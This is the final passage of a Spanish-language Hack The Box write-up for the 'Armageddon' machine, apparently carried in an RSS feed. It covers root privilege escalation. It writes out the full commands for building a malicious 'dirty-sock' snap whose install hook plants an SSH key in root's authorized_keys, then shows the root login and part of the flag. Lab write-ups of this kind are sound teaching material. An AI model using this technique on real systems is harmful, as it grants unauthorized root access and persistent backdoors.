&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## Initialize the directory as a snap project&lt;/span&gt;
snapcraft init

&lt;span class=&#34;c1&#34;&gt;## Set up the install hook&lt;/span&gt;
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install

&lt;span class=&#34;c1&#34;&gt;## Write the script we want to execute as root&lt;/span&gt;
cat &amp;gt; snap/hooks/install &amp;lt;&amp;lt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;EOF&amp;#34;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#!/bin/sh -e&lt;/span&gt;

mkdir /root/.ssh/
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ssh-rsa AAAAB3NzaC1yc[...]+4t1Hvv32e+fKi4F7iu/YG6xyyZXj brucetherealadmin@armageddon.htb&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /root/.ssh/authorized_keys
EOF

&lt;span class=&#34;c1&#34;&gt;## Configure the snap yaml file&lt;/span&gt;
cat &amp;gt; snap/snapcraft.yaml &amp;lt;&amp;lt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;EOF&amp;#34;&lt;/span&gt;
name: dirty-sock
version: &lt;span class=&#34;s1&#34;&gt;&amp;#39;0.1&amp;#39;&lt;/span&gt; 
summary: Empty snap, used &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; exploit
description: &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF

&lt;span class=&#34;c1&#34;&gt;## Build the snap&lt;/span&gt;
snapcraft
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con esto se crearÃ¡ el archivo &lt;code&gt;dirty-sock_0.1_amd64.snap&lt;/code&gt; el cual trasladamos a la maquin e instalamos en modo &lt;code&gt;devmode&lt;/code&gt;, al no haber ningun tipo de error verificamos que los comandos fueron ejecutados ingresando al usuario root mediante SSH, lo cual nos permitiÃ³ obtener una shell y flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ sudo snap install dirty-sock_0.1_amd64.snap --devmode
dirty-sock 0.1 installed
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ ssh root@localhost
The authenticity of host &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost (::1)&amp;#39;&lt;/span&gt; can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t be established.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ECDSA key fingerprint is MD5:3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Are you sure you want to continue connecting (yes/no)? yes
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;localhost&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to the list of known hosts.
Last login: Tue Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 12:51:31 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# whoami&lt;/span&gt;
root
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# ls&lt;/span&gt;
anaconda-ks.cfg  cleanup.sh  passwd  reset.sh  root.txt  snap
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# cat root.txt | cut -c1-15&lt;/span&gt;
7ed932f4e56933d
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;crontab&#34;&gt;CRONTAB&lt;/h3&gt;
&lt;p&gt;Con el usuario root encontramos dos crons, los cuales restauran archivos, limpian carpetas y eliminan los snaps instalados.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# crontab -l &lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; * * * * /root/reset.sh
* * * * * /root/cleanup.sh
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# cat /root/reset.sh&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;

cp /root/passwd /etc/passwd
rm -rf /tmp/* /dev/shm/*

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# cat /root/cleanup.sh&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;

/usr/bin/snap list &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tail -n +2 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;^core &amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; s
&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
  /usr/bin/snap remove --purge &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/armageddon/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/armageddon/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>drupal</category>
            
          
            
              <category>drupalgeddon2</category>
            
          
            
              <category>snap</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>